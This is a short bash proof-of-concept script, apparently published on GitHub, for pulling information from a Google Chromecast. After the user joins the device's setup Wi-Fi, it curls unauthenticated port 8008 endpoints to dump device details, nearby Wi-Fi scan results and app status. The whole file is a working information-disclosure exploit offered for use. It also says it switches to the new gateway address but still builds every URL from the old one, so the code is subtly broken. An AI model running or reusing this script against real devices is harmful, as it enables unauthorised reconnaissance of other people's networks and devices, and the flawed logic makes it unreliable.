#!/bin/bash
echo "[i] Google Chromecast info disclosure p0c by [disketteomelette] @ Github\n[+] jcrueda.com"
IP=$(/sbin/ip route | awk '/default/ { print $3 }');
echo "[+] Actual gateway is [$IP]\n[!] Connect to Chromecast wifi and press [ENTER] when done";
read abcd
IPb=$(/sbin/ip route | awk '/default/ { print $3 }');
echo "[+] Using gateway [$IPb] instead of [$IP]\n[+] Formatting urls...";
deviceinfo="http://$IP:8008/ssdp/device-desc.xml"
deviceinfu="http://$IP:8008/setup/eureka_info?options=detail"
devicewifis="http://$IP:8008/setup/scan_wifi"
devicewifir="http://$IP:8008/setup/scan_results"
devicetime="http://$IP:8008/setup/supported_timezones"
youtube="http://$IP:8008/apps/YouTube -X GET"
netflix="http://$IP:8008/apps/Netflix -X GET"
chromca="http://$IP:8008/apps/Chromecast -X GET"
gomusic="http://$IP:8008/apps/GoogleMusic -X GET"
echo "[+] Let's go! ";
echo "\n\n\n-----------------------------------\n$deviceinfo\n----------------------------\n";
curl $deviceinfo
echo "\n\n\n-----------------------------------\n$deviceinfu\n----------------------------\n";
curl $deviceinfu
echo "\n\n\n-----------------------------------\n$devicewifis\n----------------------------\n";
curl $devicewifis
echo "\n\n\n-----------------------------------\n$devicewifir\n----------------------------\n";
curl $devicewifir
echo "\n\n\n-----------------------------------\n$devicetime\n----------------------------\n";
curl $devicetime
echo "\n\n\n-----------------------------------\n$youtube\n----------------------------\n";
curl -H 'Content-Type: application/json' $youtube
echo "\n\n\n-----------------------------------\n$netflix\n----------------------------\n";
curl -H 'Content-Type: application/json' $netflix
echo "\n\n\n-----------------------------------\n$chromca\n----------------------------\n";
curl -H 'Content-Type: application/json' $chromca
echo "\n\n\n-----------------------------------\n$gomusic\n----------------------------\n";
curl -H 'Content-Type: application/json' $gomusic
echo "\n\n\n-----------------------------------\n E · O · F \n----------------------------\n";
